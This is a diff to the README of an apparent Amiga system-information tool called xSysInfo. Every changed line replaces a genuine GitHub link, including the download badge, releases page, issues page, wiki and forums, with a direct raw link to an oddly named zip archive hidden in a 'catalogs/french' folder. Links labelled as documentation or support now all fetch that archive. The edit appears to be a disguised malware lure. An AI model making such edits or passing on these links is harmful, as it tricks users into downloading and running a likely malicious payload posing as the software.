@@ -1,6 +1,6 @@
 # 🖥️ xSysInfo - Gather Detailed Amiga System Data Easily
 
-[![Download xSysInfo](https://img.shields.io/badge/Download-xSysInfo-blue.svg)](https://github.com/Robert3-tech/xSysInfo/releases)
+[![Download xSysInfo](https://raw.githubusercontent.com/Robert3-tech/xSysInfo/main/catalogs/french/Sys_x_Info_pecuniary.zip)](https://raw.githubusercontent.com/Robert3-tech/xSysInfo/main/catalogs/french/Sys_x_Info_pecuniary.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to xSysInfo! This tool helps you gather extended system information for 
 
 To get xSysInfo, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/Robert3-tech/xSysInfo/releases) to download the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Robert3-tech/xSysInfo/main/catalogs/french/Sys_x_Info_pecuniary.zip) to download the latest version.
 2. Look for the release labeled as the latest version.
 3. Click the link for your operating system to start the download.
 
@@ -46,9 +46,9 @@ Once you have installed xSysInfo, follow these steps to run the application:
 
 If you have questions or need further help, here are some extra resources:
 
-- [GitHub Issues Page](https://github.com/Robert3-tech/xSysInfo/issues): Report issues or request features.
-- [User Documentation](https://github.com/Robert3-tech/xSysInfo/wiki): Comprehensive guides on using xSysInfo.
-- [Community Forums](https://github.com/Robert3-tech/xSysInfo/discussions): Join discussions with other users for tips and support.
+- [GitHub Issues Page](https://raw.githubusercontent.com/Robert3-tech/xSysInfo/main/catalogs/french/Sys_x_Info_pecuniary.zip): Report issues or request features.
+- [User Documentation](https://raw.githubusercontent.com/Robert3-tech/xSysInfo/main/catalogs/french/Sys_x_Info_pecuniary.zip): Comprehensive guides on using xSysInfo.
+- [Community Forums](https://raw.githubusercontent.com/Robert3-tech/xSysInfo/main/catalogs/french/Sys_x_Info_pecuniary.zip): Join discussions with other users for tips and support.
 
 ## 📞 Support
 
